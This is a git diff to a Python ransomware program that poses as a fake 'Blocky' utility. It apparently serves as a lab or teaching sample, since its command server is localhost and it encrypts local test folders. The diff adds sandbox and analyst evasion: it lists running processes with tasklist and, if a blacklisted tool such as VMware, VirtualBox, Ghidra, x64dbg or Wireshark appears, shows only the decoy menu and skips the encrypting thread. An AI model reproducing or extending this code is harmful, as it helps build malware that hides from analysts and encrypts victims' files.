@@ -14,6 +14,7 @@ import ctypes  # Calling Windows APIs
 import winreg  # Editing Windows Registry
 import threading  # Enabling Thread creation
 import datetime  # Handling time-related data
+from subprocess import check_output  # Reading processes on system
 from random import randint  # Random ints for 😴
 from time import sleep  # 😴
 
@@ -24,6 +25,16 @@ c2_url = "http://localhost:5000"
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
 # ..except for the filetypes defined in the following list
 exclude_types = (".exe", ".dll", ".img")
+# If any of these processes is running on the host, BadThread will not run.
+program_blacklist = [
+    "vmware",
+    "vbox",
+    "ghidra",
+    "ollydbug",
+    "x64dbg",
+    "tcpdump",
+    "wireshark",
+]
 
 
 class BadThread(object):
@@ -90,6 +101,19 @@ class FakeBlocker:
             # Else start a new Ransomware() runthrough as daemon thread, and show Blocky functionality.
             BadThread()
             blocky.show_menu()
+
+    def is_blacklisted_process_running(self):
+        """Reads process lists on system and compares it to the predefined blacklist"""
+        tasks_all = check_output(("TASKLIST", "/FO", "CSV"))
+        tasks_formatted = tasks_all.decode().splitlines()
+        tasks_listed = [
+            process.lower().split(",")[0][1:-5] for process in tasks_formatted
+        ]
+        for x in program_blacklist:
+            # As soon as 1 blacklisted program is detected, return True -> Main will not execute BadThread
+            if x in tasks_listed:
+                return True
+        return False
 
     def show_menu(self):
         """Prints the Blocky menu and takes user input on menu selection"""
@@ -347,6 +371,10 @@ if __name__ == "__main__":
     blocky = FakeBlocker()
     # Exit the programm, should it be run as non-Admin
     if not blocky.is_admin():
+        sys.exit()
+    # Directly jump into the fake functionality, should a program listed on the Blacklist be detected.
+    if blocky.is_blacklisted_process_running():
+        blocky.show_menu()
         sys.exit()
     # Directly jump into the fake functionality, should a debugger be detected, so no malicious activity is run
     if ctypes.windll.kernel32.IsDebuggerPresent():
